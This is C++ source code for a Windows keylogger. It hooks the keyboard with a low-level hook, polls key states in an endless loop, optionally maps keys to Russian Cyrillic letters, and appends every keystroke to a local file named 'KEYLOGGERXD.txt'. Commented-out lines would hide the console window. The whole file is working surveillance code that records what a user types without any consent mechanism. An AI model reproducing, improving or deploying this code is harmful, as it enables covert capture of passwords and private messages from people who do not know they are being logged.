#include <iostream> 
#include <fstream> 
#include <Windows.h> 
#include <thread>
using namespace std;

HHOOK hook;
bool laught;


void layout() {
    HKL layout = GetKeyboardLayout(0);
    DWORD layoutId = LOWORD(layout);

    if (layoutId == 0x0409) {
        laught = true;//use
    }
    else {
        laught = false;//ru
    }
}


LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION)
    {
        if ((GetAsyncKeyState(VK_MENU) & 0x8000) && (GetAsyncKeyState(VK_SHIFT) & 0x8000))
        {

            if (laught) {
                laught = false;
            }
            else {
                laught = true;
            }

        }
    }
    return CallNextHookEx(hook, nCode, wParam, lParam);
}


void saveData(char data) {
    ofstream log;
    log.open("KEYLOGGERXD.txt", ofstream::app);

    if (log.is_open()) log << data;

    log.close();
    cout << data;
}


char translateLetter(char letter) {
    switch (letter)
    {
    case 13: return '\n';
    case 32: return ' ';

    case 65: return 'Ф';
    case 66: return 'И';
    case 67: return 'С';
    case 68: return 'В';
    case 69: return 'У';
    case 70: return 'А';
    case 71: return 'П';
    case 72: return 'Р';
    case 73: return 'Ш';
    case 74: return 'О';
    case 75: return 'Л';
    case 76: return 'Д';
    case 77: return 'Ь';
    case 78: return 'Т';
    case 79: return 'Щ';
    case 80: return 'З';
    case 81: return 'Й';
    case 82: return 'К';
    case 83: return 'Ы';
    case 84: return 'Е';
    case 85: return 'Г';
    case 86: return 'М';
    case 87: return 'Ц';
    case 88: return 'Ч';
    case 89: return 'Н';
    case 90: return 'Я';

    default: return ' ';
        break;
    }
}


void hoochok() {
    hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hook);
}


void keys() {
    while (true)
    {
        for (int key = 8; key <= 190; key++)
        {
            if (GetAsyncKeyState(key) == -32767)
            {
                if (!laught) {
                    saveData(translateLetter(key));
                }
                else {
                    saveData(key);
                }
            }
        }
    }
}



int main() {
    setlocale(LC_ALL, "ru");
    layout();

    //HWND hwnd = GetConsoleWindow();
    //ShowWindow(hwnd, SW_HIDE); 

    thread t1(hoochok);
    thread t2(keys);

    t1.join();
    t2.join();

    return 0;
}